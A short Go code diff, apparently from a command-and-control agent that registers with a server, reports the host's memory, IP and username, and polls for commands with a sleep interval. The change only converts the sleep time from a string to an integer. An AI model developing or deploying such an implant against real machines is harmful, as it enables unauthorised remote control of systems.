@@ -9,7 +9,6 @@ import (
 	"net/http"
 	"os/exec"
 	"os/user"
-	"strconv"
 	"strings"
 	"time"
 
@@ -19,7 +18,7 @@ import (
 
 var (
 	IP        = "127.0.0.1"
-	SleepTime = "10"
+	SleepTime = 10
 	Jitter    = "0"
 )
 
@@ -28,7 +27,7 @@ type system_info struct {
 	Memory    uint64 `json:"total"`
 	IP        string
 	USERNAME  string
-	SleepTime string
+	SleepTime int
 }
 
 func register(serverIP string) string {
@@ -96,7 +95,6 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 func main() {
 	agent_id := register(IP)
 	fmt.Printf("Agent ID: %s\n", agent_id)
-	SleepTime, _ := strconv.Atoi(SleepTime)
 	time_dur := time.Duration(SleepTime)
 	for {
 		get_command(agent_id, IP, time_dur)
